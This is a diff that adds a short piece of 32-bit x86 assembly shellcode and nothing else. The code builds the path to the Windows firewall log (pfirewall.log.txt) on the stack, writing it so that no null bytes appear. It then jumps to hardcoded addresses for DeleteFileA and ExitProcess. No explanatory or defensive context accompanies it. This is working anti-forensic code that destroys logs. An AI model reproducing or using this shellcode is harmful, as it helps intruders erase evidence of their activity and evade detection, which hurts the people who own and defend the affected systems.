@@ -1,0 +1,75 @@
+[BITS 32]
+
+ 
+
+XOR ECX, ECX
+
+PUSH ECX
+
+MOV ECX, 0xEF636763 ; 0x00747874
+
+ADD ECX, 0X11111111 ; clear out null byte
+
+PUSH ECX
+
+ 
+
+push 2E676F6Ch
+
+push 2E6C6C61h
+
+push 77657269h
+
+push 66705C6Ch
+
+push 6C617765h
+
+push 7269465Ch
+
+push 73656C69h
+
+push 46676F4Ch
+
+push 5C32336Dh
+
+push 65747379h
+
+push 535C7377h
+
+push 6F646E69h
+
+push 575C3A43h
+
+                    ;C:\Windows\System32\LogFiles\Firewall\
+
+MOV ECX,ESP         ;save pointer to "pfirewall.log.txt" in ECX
+
+ 
+
+XOR EAX,EAX  
+
+PUSH EAX            ;put parameters on the stack
+
+PUSH ECX
+
+ 
+
+XOR ESI, ESI
+
+PUSH ESI
+
+ 
+
+MOV ESI,0x74F65e34   ;
+
+JMP ESI              ;DeleteFileA
+
+ 
+
+XOR EAX,EAX          ;clean up
+
+PUSH EAX
+
+MOV EAX,0x774323d9   ;
+
+JMP EAX              ;ExitProcess(0)
